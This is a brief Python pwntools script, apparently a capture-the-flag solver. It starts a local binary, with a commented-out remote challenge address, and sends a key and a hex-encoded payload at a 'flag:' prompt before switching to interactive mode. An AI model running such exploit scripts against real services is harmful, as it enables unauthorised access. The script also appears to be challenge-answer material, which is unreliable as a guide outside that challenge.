from pwn import *

context.log_level='debug'
context.arch='amd64'
key=2
payload='63456745e39dbf5d2345a7c5236d4fed23c5a7c5a3fd5f7d23c527c523ed4f6da3c527c5a39dff9d6345e7c5632d4fed63c567c5633d5f7d6345e745e32dcfed634567c5639dbf5da3c5a7c5a36d4f6da3c52745a3fd5ffda3c5a7c5a36dcf6d23c5a745a31dff1d6c6d1b9907a94bc9ecfdab2947b95b598f803bf907a9cb49'.decode('hex')
c = process("./a.out")
#c = remote("106.14.240.105", 13003)
c.sendlineafter(':\n',str(key)+'\n')
c.sendlineafter('flag:\n',payload)
c.interactive()
f=open('payload','wb')
f.write(str(key)+'\n')
f.write(payload+'\n')
